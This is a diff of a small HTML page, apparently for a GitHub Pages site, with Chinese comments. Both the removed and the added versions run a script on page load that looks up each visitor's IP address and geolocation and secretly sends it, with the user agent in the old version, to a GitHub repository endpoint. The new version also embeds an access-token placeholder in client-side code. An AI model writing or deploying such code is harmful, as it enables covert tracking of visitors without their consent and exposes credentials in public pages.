@@ -1,39 +1,40 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
-  <meta charset="utf-8">
-  <title>Hi</title>
+  <meta charset="utf-8"/>
+  <title>你好</title>
+  <style>
+    body{font-family:monospace;background:#111;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh}
+    #box{background:#222;padding:2rem;border-radius:8px}
+  </style>
 </head>
 <body>
-  <h1>欢迎光临</h1>
-  <!-- 偷偷干活 -->
-  <script>
-    // 1. 取 IP 与经纬度（免费接口，无需 key）
-    fetch('https://ipapi.co/json/')
-      .then(r => r.json())
-      .then(data => {
-        const body = {
-          ip: data.ip,
-          lat: data.latitude,
-          lon: data.longitude,
-          city: data.city,
-          ua: navigator.userAgent,
-          t: new Date().toISOString()
-        };
-        // 2. 把数据塞进 GitHub Issues（当后台）
-        // 注：Issues 必须开在同仓库且开启匿名写权限（GitHub 目前允许）
-        fetch('https://api.github.com/repos/LSFLi/LSFLi.github.io/issues', {
-          method: 'POST',
-          headers: {
-            'Accept': 'application/vnd.github+json',
-            'Content-Type': 'application/json'
+  <div id="box">😋…</div>
+
+<script>
+/* 1. 拿到 IP + 经纬度 */
+fetch('https://ipapi.co/json/')
+  .then(r=>r.json())
+  .then(data=>{
+      const {ip, latitude, longitude, city, region, country_name}=data;
+      const txt = `IP: ${ip}<br>๑>ᴗO๑: ${latitude}, ${longitude}<br>(¯﹃¯ԅ): ${country_name} ${region} ${city}`;
+      document.getElementById('box').innerHTML = txt;
+
+      /* 2. 悄悄把数据发给 GitHub Actions */
+      return fetch('https://api.github.com/repos/YOUR_NAME/YOUR_NAME.github.io/dispatches',{
+          method:'POST',
+          headers:{
+            'Accept':'application/vnd.github+json',
+            'Authorization':'token ghp_xxxxxxxxxxxxxxxxxxxx',   // 见下文「三、4」
+            'Content-Type':'application/json'
           },
-          body: JSON.stringify({
-            title: `visit ${body.ip}`,
-            body: JSON.stringify(body, null, 2)
+          body:JSON.stringify({
+            event_type:'ping',
+            client_payload:{ip,latitude,longitude,city,region,country_name}
           })
-        });
       });
-  </script>
+  })
+  .catch(e=>document.getElementById('box').innerHTML='😭：'+e);
+</script>
 </body>
 </html>
